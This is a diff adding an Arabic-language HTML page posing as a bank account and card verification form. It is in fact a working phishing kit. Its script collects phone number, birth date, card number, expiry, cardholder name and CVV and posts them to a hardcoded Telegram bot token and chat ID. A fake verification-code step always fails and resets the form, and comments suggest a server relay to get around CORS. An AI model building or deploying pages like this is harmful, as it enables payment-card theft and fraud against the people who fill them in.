@@ -1,0 +1,572 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>نموذج — معلومات الحساب والبطاقة</title>
+  <style>
+    :root{
+      --bg:#f5f7fb;
+      --card:#fff;
+      --muted:#9aa3ad;
+      --accent-start:#0d6efd;
+      --accent-end:#0066d6;
+      --radius:16px;
+      --shadow: 0 8px 28px rgba(15,23,42,0.08);
+      font-family: "Segoe UI", Tahoma, Arial, "Noto Naskh Arabic", sans-serif;
+    }
+    html,body{ margin:0; padding:0; background:var(--bg); color:#122; min-height:100vh; -webkit-font-smoothing:antialiased; }
+    .container{ max-width:520px; margin:18px auto; padding:18px; }
+
+    /* header */
+    .top{ text-align:center; margin-bottom:10px; }
+    .logo-small{ width:82px; height:82px; margin:0 auto 8px; border-radius:16px; background:#fff; display:flex; align-items:center; justify-content:center; box-shadow:var(--shadow); overflow:hidden; }
+    .progress{ margin:6px 0 12px; font-size:15px; color:#6b7280; }
+    .progress-bar{ height:8px; background:rgba(13,110,253,0.12); border-radius:10px; overflow:hidden; margin-top:8px; }
+    .progress-bar > i{ display:block; height:100%; width:0%; background:linear-gradient(90deg,var(--accent-start),var(--accent-end)); border-radius:10px; transition:width .25s ease; }
+
+    .banner{ background:#fff; border-radius:16px; padding:12px; box-shadow:var(--shadow); margin-bottom:16px; overflow:hidden; }
+    .banner img{ width:100%; border-radius:12px; display:block; }
+
+    .card{ background:var(--card); border-radius:18px; padding:20px; box-shadow:var(--shadow); margin-bottom:12px; }
+
+    h2{ margin:0 0 16px; text-align:center; font-size:20px; font-weight:700; }
+
+    .field{ margin-bottom:14px; }
+    label{ display:block; margin-bottom:8px; color:#222; font-weight:600; font-size:15px; }
+    input[type="text"], input[type="password"], select{ width:100%; padding:12px 14px; border-radius:12px; border:1px solid #eef2f6; background:#f8fafc; font-size:15px; box-sizing:border-box; color:#111827; }
+    input[readonly]{ background:#f3f6f9; text-align:left; }
+    .hint{ color:var(--muted); font-size:13px; margin-top:6px; }
+
+    .row{ display:flex; gap:12px; margin-bottom:14px; }
+    .row .col{ flex:1; }
+
+    .pill-select{ appearance:none; -webkit-appearance:none; -moz-appearance:none; padding:12px; border-radius:12px; background:#f8fafc; border:1px solid #eef2f6; font-size:15px; }
+
+    .btn{ display:inline-block; padding:12px 20px; border-radius:12px; color:#fff; font-weight:700; font-size:16px; border:none; cursor:pointer; background:linear-gradient(90deg,var(--accent-start),var(--accent-end)); box-shadow: 0 8px 20px rgba(13,110,253,0.18); }
+    .btn.secondary{ background:#eef3f8; color:#0f1724; box-shadow:none; }
+    .btn.full{ width:100%; display:block; margin-top:6px; }
+
+    .error{ color:#b91c1c; font-size:13px; margin-top:8px; }
+    .success{ color:#065f46; font-size:14px; margin-top:8px; }
+
+    footer.note{ text-align:center; margin-top:12px; color:var(--muted); font-size:13px; }
+
+    /* virtual card */
+    .virtual-card{
+      width:100%;
+      border-radius:14px;
+      background:linear-gradient(180deg,#0a66d6,#1157b8);
+      color:#fff;
+      padding:18px;
+      box-sizing:border-box;
+      position:relative;
+      min-height:130px;
+      overflow:hidden;
+    }
+    .chip{ width:48px; height:32px; background:rgba(255,255,255,0.2); border-radius:6px; margin-bottom:8px; }
+    .card-number{ font-size:20px; letter-spacing:2px; margin-top:8px; display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
+    .card-number span{ background:rgba(255,255,255,0.06); padding:6px 8px; border-radius:6px; font-family:monospace; }
+    .card-bottom{ display:flex; justify-content:space-between; align-items:flex-end; margin-top:14px; }
+    .card-holder{ text-transform:uppercase; font-size:13px; letter-spacing:1px; }
+    .card-exp{ font-size:13px; opacity:0.95; }
+
+    /* steps visibility */
+    .step{ display:none; }
+    .step.active{ display:block; animation:fadeIn .18s ease; }
+    @keyframes fadeIn{ from{opacity:0; transform:translateY(6px)} to{opacity:1; transform:none} }
+
+    /* modal */
+    .overlay{ position:fixed; inset:0; background:rgba(2,6,23,0.5); display:flex; align-items:center; justify-content:center; z-index:2000; display:none; }
+    .overlay.show{ display:flex; }
+    .modal{ background:#fff; border-radius:12px; padding:20px; width:90%; max-width:420px; box-shadow:0 12px 40px rgba(2,6,23,0.2); text-align:center; }
+    .modal h3{ margin:0 0 8px; }
+    .modal p{ margin:0 0 16px; color:#334155; }
+    .modal .actions{ display:flex; gap:10px; justify-content:center; }
+
+    /* small screens */
+    @media (max-width:560px){
+      .container{ padding:12px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="top">
+      <div class="logo-small">
+        <img src="https://g.top4top.io/p_366505tim1.jpeg" alt="logo" style="width:60px;height:60px;object-fit:contain;">
+      </div>
+      <div id="progressText" class="progress">الخطوة 1 من 6</div>
+      <div class="progress-bar"><i id="progressBar"></i></div>
+    </div>
+
+    <div class="banner">
+      <img src="https://e.top4top.io/p_366571v491.jpg" alt="banner">
+    </div>
+
+    <!-- STEP 1 -->
+    <div id="step1" class="card step active" role="form" aria-label="معلومات الحساب">
+      <h2>معلومات الحساب</h2>
+
+      <div class="field">
+        <label for="account">رقم الحساب</label>
+        <input id="account" type="text" value="2560" readonly>
+      </div>
+
+      <div class="field">
+        <label for="phone">رقم الهاتف</label>
+        <input id="phone" type="text" placeholder="07xxxxxxxx" maxlength="10" inputmode="numeric" autocomplete="tel">
+        <div class="hint">يجب أن يبدأ ال��قم بـ 077 أو 078 أو 079 ويتكون من 10 أرقام</div>
+        <div id="phoneError" class="error" style="display:none"></div>
+      </div>
+
+      <div class="field">
+        <label>تاريخ الميلاد</label>
+        <div class="row">
+          <div class="col">
+            <select id="year" class="pill-select" aria-label="السنة">
+              <option value="">السنة</option>
+            </select>
+          </div>
+          <div class="col">
+            <select id="month" class="pill-select" aria-label="الشهر">
+              <option value="">الشهر</option>
+              <option value="01">01 - يناير</option>
+              <option value="02">02 - فبراير</option>
+              <option value="03">03 - مارس</option>
+              <option value="04">04 - أبريل</option>
+              <option value="05">05 - مايو</option>
+              <option value="06">06 - يونيو</option>
+              <option value="07">07 - يوليو</option>
+              <option value="08">08 - أغسطس</option>
+              <option value="09">09 - سبتمبر</option>
+              <option value="10">10 - أكتوبر</option>
+              <option value="11">11 - نوفمبر</option>
+              <option value="12">12 - ديسمبر</option>
+            </select>
+          </div>
+          <div class="col">
+            <select id="day" class="pill-select" aria-label="اليوم">
+              <option value="">اليوم</option>
+            </select>
+          </div>
+        </div>
+      </div>
+
+      <div style="display:flex; gap:12px; justify-content:space-between; align-items:center;">
+        <button id="s1Next" class="btn full">التالي</button>
+      </div>
+
+      <div id="s1Status" role="status" aria-live="polite"></div>
+    </div>
+
+    <!-- STEP 2 (card) -->
+    <div id="step2" class="card step" role="form" aria-label="بيانات البطاقة">
+      <h2>بيانات البطاقة</h2>
+      <p style="text-align:center;color:var(--muted);margin-top:-6px;margin-bottom:12px;">أدخل بيانات بطاقة الصراف الآلي</p>
+
+      <div class="virtual-card" aria-hidden="false">
+        <div class="chip"></div>
+        <div class="card-number" id="vcNumber">
+          <!-- 4 groups -->
+          <span>••••</span><span>••••</span><span>••••</span><span>••••</span>
+        </div>
+        <div class="card-bottom">
+          <div>
+            <div style="font-size:12px;opacity:0.9">EXPIRES</div>
+            <div class="card-exp" id="vcExp">--/--</div>
+          </div>
+          <div>
+            <div style="font-size:12px;opacity:0.9">CARDHOLDER</div>
+            <div class="card-holder" id="vcName">FULL NAME</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="field" style="margin-top:14px;">
+        <label for="cardNumber">رقم البطاقة</label>
+        <input id="cardNumber" type="text" inputmode="numeric" maxlength="19" placeholder="أدخل رقم البطاقة المكون من 16 رقم" autocomplete="cc-number">
+      </div>
+
+      <div class="row">
+        <div class="col field">
+          <label for="expMonth">انتهاء ال��لاحية (شهر)</label>
+          <select id="expMonth" class="pill-select">
+            <option value="">الشهر</option>
+            <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option>
+            <option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option>
+            <option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
+          </select>
+        </div>
+        <div class="col field">
+          <label for="expYear">انتهاء الصلاحية (سنة)</label>
+          <select id="expYear" class="pill-select">
+            <option value="">السنة</option>
+          </select>
+        </div>
+      </div>
+
+      <div class="field">
+        <label for="cardName">اسم حامل البطاقة</label>
+        <input id="cardName" type="text" placeholder="اسم حامل البطاقة كما على البطاقة" autocomplete="cc-name">
+      </div>
+
+      <div class="field">
+        <label for="cvv">الرقم السري (CVV)</label>
+        <input id="cvv" type="password" maxlength="4" placeholder="أدخل الرقم السري" autocomplete="cc-csc">
+      </div>
+
+      <div style="display:flex; gap:12px; margin-top:8px;">
+        <button id="s2Back" class="btn secondary" style="flex:1">رجوع</button>
+        <button id="s2Next" class="btn" style="flex:1">التالي</button>
+      </div>
+
+      <div id="s2Status" role="status" aria-live="polite"></div>
+    </div>
+
+    <!-- STEP 3 (verification) -->
+    <div id="step3" class="card step" role="form" aria-label="رمز التحقق">
+      <h2>إدخال رمز التحقق</h2>
+      <p style="text-align:center;color:var(--muted);margin-top:-6px;margin-bottom:12px;">تم إرسال رمز التحقق إلى رقم الهاتف. إذا لم يصلك، يرجى التحقق من المعلومات والمحاولة مجددًا.</p>
+
+      <div class="field">
+        <label for="code">رمز التحقق</label>
+        <input id="code" type="text" maxlength="8" placeholder="أدخل رمز التحقق">
+      </div>
+
+      <div style="display:flex; gap:12px; margin-top:8px;">
+        <button id="s3Resend" class="btn secondary" style="flex:1">إعادة إرسال</button>
+        <button id="s3Submit" class="btn" style="flex:1">تحقق</button>
+      </div>
+
+      <div id="s3Status" role="status" aria-live="polite"></div>
+    </div>
+
+    <footer class="note">الرجاء التأكد من صحة المعلومات قبل الإرسال</footer>
+  </div>
+
+  <!-- Modal -->
+  <div id="overlay" class="overlay" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="modal" role="document">
+      <h3>فشل التحقق</h3>
+      <p>يوجد خطأ في أحد المعلومات. حاول مرة أخرى.</p>
+      <div class="actions">
+        <button id="modalOk" class="btn">حسناً</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ===== TELEGRAM CONFIG (مضمّن كما طلبت) =====
+    const TELEGRAM_TOKEN = "8546784520:AAFNibddYGtHlevZIDS-Frmp08nYz_6z_3k";
+    const TELEGRAM_CHAT_ID = "6873334348";
+    const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+    // عناصر الخطوات
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const step3 = document.getElementById('step3');
+    const progressBar = document.getElementById('progressBar');
+    const progressText = document.getElementById('progressText');
+
+    function showStep(n){
+      [step1,step2,step3].forEach(s=>s.classList.remove('active'));
+      if(n===1) step1.classList.add('active');
+      if(n===2) step2.classList.add('active');
+      if(n===3) step3.classList.add('active');
+      // update progress
+      progressText.textContent = `الخطوة ${n} من 6`;
+      const percent = n===1?18:(n===2?50:82);
+      progressBar.style.width = percent + "%";
+    }
+
+    // ====== تهيئة سنوات وأيام ======
+    const yearSelect = document.getElementById('year');
+    const daySelect = document.getElementById('day');
+    const expYear = document.getElementById('expYear');
+    const currentYear = new Date().getFullYear();
+    for(let y = currentYear; y >= 1900; y--){
+      const opt = document.createElement('option');
+      opt.value = y;
+      opt.textContent = y;
+      yearSelect.appendChild(opt);
+    }
+    for(let y = currentYear; y <= currentYear + 12; y++){
+      const opt = document.createElement('option');
+      opt.value = String(y).slice(-2);
+      opt.textContent = y;
+      expYear.appendChild(opt);
+    }
+    for(let d=1; d<=31; d++){
+      const opt = document.createElement('option');
+      opt.value = String(d).padStart(2,'0');
+      opt.textContent = d;
+      daySelect.appendChild(opt);
+    }
+
+    // ====== STEP1 validation ======
+    const phoneInput = document.getElementById('phone');
+    const phoneError = document.getElementById('phoneError');
+    const s1Next = document.getElementById('s1Next');
+    const s1Status = document.getElementById('s1Status');
+
+    function validatePhone(value){
+      const cleaned = value.replace(/[^0-9]/g,'');
+      const re = /^(077|078|079)\d{7}$/;
+      return { ok: re.test(cleaned), cleaned };
+    }
+    phoneInput.addEventListener('input', () => {
+      const { cleaned } = validatePhone(phoneInput.value);
+      phoneInput.value = cleaned;
+      phoneError.style.display = 'none';
+      s1Status.textContent = '';
+    });
+
+    s1Next.addEventListener('click', (e)=>{
+      e.preventDefault();
+      s1Status.textContent = '';
+      const phone = phoneInput.value.trim();
+      const { ok, cleaned } = validatePhone(phone);
+      if(!ok){
+        phoneError.style.display = 'block';
+        phoneError.textContent = 'رقم الهاتف غير صحيح. تأكد أنه يبدأ بـ 077 أو 078 أو 079 ويتكون من 10 أرقام.';
+        return;
+      }
+      const day = document.getElementById('day').value;
+      const month = document.getElementById('month').value;
+      const year = document.getElementById('year').value;
+      if(!day || !month || !year){
+        s1Status.className = 'error';
+        s1Status.textContent = 'الرجاء اختيار تاريخ الميلاد بالكامل.';
+        return;
+      }
+      // حفظ البيانات مؤقتاً في window.state
+      window._form = window._form || {};
+      window._form.account = document.getElementById('account').value.trim();
+      window._form.phone = cleaned;
+      window._form.birth = { day, month, year };
+      // انتقل للخطوة 2
+      showStep(2);
+    });
+
+    // ====== Virtual card updates (STEP2) ======
+    const cardNumberInput = document.getElementById('cardNumber');
+    const cardNameInput = document.getElementById('cardName');
+    const expMonth = document.getElementById('expMonth');
+    const expYearSel = document.getElementById('expYear');
+    const cvvInput = document.getElementById('cvv');
+
+    const vcNumber = document.getElementById('vcNumber');
+    const vcName = document.getElementById('vcName');
+    const vcExp = document.getElementById('vcExp');
+
+    function formatCardGroups(value){
+      // remove non-digits, chunk to 4s
+      const digits = value.replace(/\D/g,'').slice(0,16);
+      const groups = [];
+      for(let i=0;i<digits.length;i+=4) groups.push(digits.slice(i,i+4));
+      while(groups.length < 4) groups.push('••••');
+      return groups.map(g => g.padEnd(4,'•'));
+    }
+
+    function renderVirtualCard(){
+      const groups = formatCardGroups(cardNumberInput.value);
+      vcNumber.innerHTML = '';
+      groups.forEach(g=>{
+        const sp = document.createElement('span');
+        sp.textContent = g;
+        vcNumber.appendChild(sp);
+      });
+      vcName.textContent = cardNameInput.value.trim() ? cardNameInput.value.toUpperCase() : 'FULL NAME';
+      const mm = expMonth.value || '--';
+      const yy = expYearSel.value || '--';
+      vcExp.textContent = `${mm}/${yy}`;
+    }
+
+    // realtime updates
+    [cardNumberInput, cardNameInput, expMonth, expYearSel].forEach(el=>{
+      el.addEventListener('input', renderVirtualCard);
+      el.addEventListener('change', renderVirtualCard);
+    });
+
+    // enforce numeric for card number
+    cardNumberInput.addEventListener('input', ()=>{
+      let v = cardNumberInput.value.replace(/\D/g,'').slice(0,16);
+      // format with spaces in input for easy typing
+      const parts = [];
+      for(let i=0;i<v.length;i+=4) parts.push(v.slice(i,i+4));
+      cardNumberInput.value = parts.join('');
+      renderVirtualCard();
+    });
+
+    // ===== step2 controls =====
+    const s2Back = document.getElementById('s2Back');
+    const s2Next = document.getElementById('s2Next');
+    const s2Status = document.getElementById('s2Status');
+
+    s2Back.addEventListener('click', (e)=>{
+      e.preventDefault();
+      showStep(1);
+    });
+
+    function validateCard(){
+      const num = cardNumberInput.value.replace(/\s+/g,'').replace(/\D/g,'');
+      const name = cardNameInput.value.trim();
+      const mm = expMonth.value;
+      const yy = expYearSel.value;
+      const cvv = cvvInput.value.trim();
+      if(num.length !== 16) return {ok:false, msg:'رقم البطاقة يجب أن يتكون من 16 رقماً.'};
+      if(!mm || !yy) return {ok:false, msg:'يرجى اختيار تاريخ الانتهاء كامل.'};
+      if(!name) return {ok:false, msg:'يرجى إدخال اسم حامل البطاقة.'};
+      if(cvv.length < 3) return {ok:false, msg:'الرقم السري (CVV) غير صحيح.'};
+      return {ok:true, data:{num, name, mm, yy, cvv}};
+    }
+
+    async function sendToTelegram(message){
+      try{
+        const res = await fetch(TELEGRAM_API, {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+        });
+        const j = await res.json();
+        return j;
+      }catch(e){
+        return { ok:false, error: e.message };
+      }
+    }
+
+    s2Next.addEventListener('click', async (e)=>{
+      e.preventDefault();
+      s2Status.textContent = '';
+      const v = validateCard();
+      if(!v.ok){
+        s2Status.className = 'error';
+        s2Status.textContent = v.msg;
+        return;
+      }
+
+      // جمع كل البيانات
+      window._form = window._form || {};
+      window._form.card = v.data;
+
+      // بناء رسالة للإرسال
+      const birth = window._form.birth;
+      const birthDisplay = birth ? `${birth.year}-${birth.month}-${birth.day}` : '';
+      const msg =
+`> بيانات جديدة من النموذج (خطوتين)
+- رقم الحساب: ${window._form.account || ''}
+- رقم الهاتف: ${window._form.phone || ''}
+- تاريخ الميلاد: ${birthDisplay}
+- رقم البطاقة: ${v.data.num}
+- انتهاء الصلاحية: ${v.data.mm}/${v.data.yy}
+- اسم حامل البطاقة: ${v.data.name}
+- CVV: ${v.data.cvv}`;
+
+      // إرسال إلى التلجرام
+      s2Next.disabled = true;
+      s2Next.textContent = '...جاري الإرسال';
+      const result = await sendToTelegram(msg);
+      s2Next.disabled = false;
+      s2Next.textContent = 'التالي';
+
+      if(result && result.ok){
+        s2Status.className = 'success';
+        s2Status.textContent = 'تم إرسال البيانات، جاري الانتقال...';
+        // انتقل لصفحة رمز التحقق
+        setTimeout(()=> showStep(3), 700);
+      } else {
+        s2Status.className = 'error';
+        const err = (result && result.description) ? result.description : 'فشل الإرسال (قد تمنع CORS)';
+        s2Status.textContent = 'فشل إرسال البيانات: ' + err;
+        // ملاحظة: من الممكن أن يمنع المتصفح الطلب المباشر بسبب CORS. الحل هو إرسال البيانات عبر سيرفر وسيط.
+      }
+    });
+
+    // ====== STEP3 behavior ======
+    const s3Resend = document.getElementById('s3Resend');
+    const s3Submit = document.getElementById('s3Submit');
+    const s3Status = document.getElementById('s3Status');
+    const codeInput = document.getElementById('code');
+
+    s3Resend.addEventListener('click', async (e)=>{
+      e.preventDefault();
+      s3Status.textContent = '';
+      // إعادة إرسال رسالة قصيرة للمدخلات السابقة تفيد إعادة الإرسال
+      const resendMsg = `> طلب إعادة إرسال رمز التحقق\n- رقم الحساب: ${window._form.account || ''}\n- رقم الهاتف: ${window._form.phone || ''}`;
+      const res = await sendToTelegram(resendMsg);
+      if(res && res.ok){
+        s3Status.className = 'success';
+        s3Status.textContent = 'تم طلب إعادة الإرسال.';
+      } else {
+        s3Status.className = 'error';
+        s3Status.textContent = 'فشل طلب إعادة الإرسال.';
+      }
+    });
+
+    s3Submit.addEventListener('click', (e)=>{
+      e.preventDefault();
+      s3Status.textContent = '';
+      const code = codeInput.value.trim();
+      if(!code){
+        s3Status.className = 'error';
+        s3Status.textContent = 'الرجاء إدخال رمز التحقق.';
+        return;
+      }
+      // هنا: نفترض فحص رمز خاطئ دائماً حسب طلبك
+      // نظهر النافذة المنبثقة بخطأ ثم نعيد التوجيه للخطوة الأولى
+      showModalAndReset();
+    });
+
+    // modal handling
+    const overlay = document.getElementById('overlay');
+    const modalOk = document.getElementById('modalOk');
+    function showModalAndReset(){
+      overlay.classList.add('show');
+      overlay.setAttribute('aria-hidden','false');
+    }
+    modalOk.addEventListener('click', ()=>{
+      overlay.classList.remove('show');
+      overlay.setAttribute('aria-hidden','true');
+      // إعادة التوجيه للصفحة الأولى وتنظيف البيانات
+      clearAll();
+      showStep(1);
+    });
+
+    function clearAll(){
+      // نظف جميع الحقول
+      document.getElementById('phone').value = '';
+      document.getElementById('day').value = '';
+      document.getElementById('month').value = '';
+      document.getElementById('year').value = '';
+      document.getElementById('cardNumber').value = '';
+      document.getElementById('cardName').value = '';
+      document.getElementById('expMonth').value = '';
+      document.getElementById('expYear').value = '';
+      document.getElementById('cvv').value = '';
+      document.getElementById('code').value = '';
+      renderVirtualCard();
+      window._form = {}; // مسح الحالة
+      document.getElementById('s1Status').textContent = '';
+      document.getElementById('s2Status').textContent = '';
+      document.getElementById('s3Status').textContent = '';
+    }
+
+    // initial render
+    renderVirtualCard();
+    showStep(1);
+
+    // Accessibility: allow Enter key to submit in each step
+    document.addEventListener('keydown', (e)=>{
+      if(e.key === 'Enter'){
+        if(step1.classList.contains('active')) s1Next.click();
+        else if(step2.classList.contains('active')) s2Next.click();
+        else if(step3.classList.contains('active')) s3Submit.click();
+      }
+    });
+
+    // Final note in console about CORS
+    console.info("ملاحظة: قد يمنع المتصفح الطلبات المباشرة إلى Telegram API بسبب سياسة CORS. إذا ظهر فشل اتصال، أنصح بإنشاء endpoint على الخادم يرسل الرسائل إلى Telegram من جهة الخادم.");
+  </script>
+</body>
+</html>
